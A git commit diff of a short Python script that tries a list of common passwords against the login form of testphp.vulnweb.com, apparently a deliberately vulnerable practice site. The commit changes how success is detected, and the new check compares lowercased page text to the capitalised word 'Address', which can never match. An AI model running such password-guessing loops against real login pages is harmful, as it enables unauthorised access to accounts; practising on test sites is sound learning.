7c450c8a4c8050e1c6f8f51e893410fedbb6aef6
mlwaare <ahahaheheheh477@gmail.com>
2025-08-29 08:40:09 +0300

    Update conan.py

--- conan.py
+++ conan.py
@@ -2,16 +2,19 @@ import requests
 
 url = "http://testphp.vulnweb.com/login.php"
 username = "test"
-passwords = ["1234", "test", "password", "admin", "123456"]
+
+
+passwords = ["1234", "password", "admin", "test", "123456"]
 
 for pwd in passwords:
     data = {"uname": username, "pass": pwd}
-    r = requests.post(url, data=data, allow_redirects=False)
+    r = requests.post(url, data=data)
 
     print(f"Trying: {pwd}")
 
-    # هنا هنستخدم الـ status code
-    if r.status_code == 302:  # الموقع هيعمل Redirect لو الدخول صحيح
-        print(f"✅ كلمة السر الصحيحة: {pwd}")
+
+    if "logout" in r.text.lower() or "Address" in r.text.lower():
+        print(f"✅ Pass: {pwd}")
+        break
     else:
-        print("❌ غلط")
+        print("❌ No")
